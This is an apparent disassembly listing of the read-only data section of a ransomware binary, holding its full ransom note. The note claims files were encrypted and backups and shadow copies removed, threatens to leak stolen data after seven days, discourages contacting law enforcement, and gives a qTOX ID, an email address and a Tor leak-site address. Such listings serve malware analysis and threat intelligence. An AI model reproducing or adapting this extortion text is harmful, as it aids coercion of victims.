.rdata:0000000140014BDF                 db 0Dh,0Ah
.rdata:0000000140014BE1                 db 'We entered. We looked around. We took what was there.',0Dh,0Ah
.rdata:0000000140014C18                 db 0Dh,0Ah
.rdata:0000000140014C1A                 db 'This is the report.',0Dh,0Ah
.rdata:0000000140014C2F                 db 0Dh,0Ah
.rdata:0000000140014C31                 db '-----------------------------------------------------------------'
.rdata:0000000140014C72                 db '---------',0Dh,0Ah
.rdata:0000000140014C7D                 db 0Dh,0Ah
.rdata:0000000140014C7F                 db 'WHAT WE DID',0Dh,0Ah
.rdata:0000000140014C8C                 db 0Dh,0Ah
.rdata:0000000140014C8E                 db 'Files were encrypted where they sat. A unique key per',0Dh,0Ah
.rdata:0000000140014CC5                 db 'file, wrapped under an offline key that leaves with us',0Dh,0Ah
.rdata:0000000140014CFD                 db 'when this is over. Backups and shadow copies were',0Dh,0Ah
.rdata:0000000140014D30                 db 'removed because they get in the way.',0Dh,0Ah
.rdata:0000000140014D56                 db 0Dh,0Ah
.rdata:0000000140014D58                 db 'No files were deleted. No data was corrupted. Every',0Dh,0Ah
.rdata:0000000140014D8D                 db 'byte can be recovered.',0Dh,0Ah
.rdata:0000000140014DA5                 db 0Dh,0Ah
.rdata:0000000140014DA7                 db '-----------------------------------------------------------------'
.rdata:0000000140014DE8                 db '---------',0Dh,0Ah
.rdata:0000000140014DF3                 db 0Dh,0Ah
.rdata:0000000140014DF5                 db 'WHAT WE TOOK',0Dh,0Ah
.rdata:0000000140014E03                 db 0Dh,0Ah
.rdata:0000000140014E05                 db 'A copy of your internal data was extracted during the',0Dh,0Ah
.rdata:0000000140014E3C                 db 'process. This is not a threat - it is a statement of',0Dh,0Ah
.rdata:0000000140014E72                 db 'fact. We have it. You do not.',0Dh,0Ah
.rdata:0000000140014E91                 db 0Dh,0Ah
.rdata:0000000140014E93                 db 'If an agreement is reached, all copies are destroyed',0Dh,0Ah
.rdata:0000000140014EC9                 db 'and you receive written confirmation. If no agreement',0Dh,0Ah
.rdata:0000000140014F00                 db 'is reached, the data finds new owners.',0Dh,0Ah
.rdata:0000000140014F28                 db 0Dh,0Ah
.rdata:0000000140014F2A                 db '-----------------------------------------------------------------'
.rdata:0000000140014F6B                 db '---------',0Dh,0Ah
.rdata:0000000140014F76                 db 0Dh,0Ah
.rdata:0000000140014F78                 db 'NEXT MOVE',0Dh,0Ah
.rdata:0000000140014F83                 db 0Dh,0Ah
.rdata:0000000140014F85                 db 'Contact us via qTOX: 59DE03AE55C400954D0973FFB90C251A7FDCEB3079A4'
.rdata:0000000140014FC6                 db '2DF6A6DB93E7D1915F5C47B238A2A99E',0Dh,0Ah
.rdata:0000000140014FE8                 db 'Contact us via EMAIL: thedoctorcame@protonmail.com',0Dh,0Ah
.rdata:000000014001501C                 db 'Case:    873F5435',0Dh,0Ah
.rdata:000000014001502F                 db 0Dh,0Ah
.rdata:0000000140015031                 db 'Download qTOX: https://qtox.github.io/',0Dh,0Ah
.rdata:0000000140015059                 db 0Dh,0Ah
.rdata:000000014001505B                 db 'Send 2 files. We decrypt them. This is not a',0Dh,0Ah
.rdata:0000000140015089                 db 'negotiation tactic - it is verification that we',0Dh,0Ah
.rdata:00000001400150BA                 db 'hold the keys and that recovery is possible.',0Dh,0Ah
.rdata:00000001400150E8                 db 'Once you have proof, we talk.',0Dh,0Ah
.rdata:0000000140015107                 db 0Dh,0Ah
.rdata:0000000140015109                 db 'No intermediaries. No recovery consultants. No law',0Dh,0Ah
.rdata:000000014001513D                 db 'enforcement liaison. Every person you add to this',0Dh,0Ah
.rdata:0000000140015170                 db 'conversation is another person who knows what',0Dh,0Ah
.rdata:000000014001519F                 db 'happened here.',0Dh,0Ah
.rdata:00000001400151AF                 db 0Dh,0Ah
.rdata:00000001400151B1                 db '-----------------------------------------------------------------'
.rdata:00000001400151F2                 db '---------',0Dh,0Ah
.rdata:00000001400151FD                 db 0Dh,0Ah
.rdata:00000001400151FF                 db 'TIMELINE',0Dh,0Ah
.rdata:0000000140015209                 db 0Dh,0Ah
.rdata:000000014001520B                 db 'Day 7 - the full dataset is released. Regulators,',0Dh,0Ah
.rdata:000000014001523E                 db 'clients, and affected parties are notified directly.',0Dh,0Ah
.rdata:0000000140015274                 db 0Dh,0Ah
.rdata:0000000140015276                 db 'Disclosure site (Tor): http://lthicpjqc7gkn5eq3epxndc2uig3yngvcbd'
.rdata:00000001400152B7                 db 'ya4u3m3byjod5km4yuwqd.onion/',0Dh,0Ah
.rdata:00000001400152D5                 db 0Dh,0Ah
.rdata:00000001400152D7                 db '-----------------------------------------------------------------'
.rdata:0000000140015318                 db '---------',0Dh,0Ah
.rdata:0000000140015323                 db 0Dh,0Ah
.rdata:0000000140015325                 db 'This message is your copy. We do not send reminders.',0Dh,0Ah,0
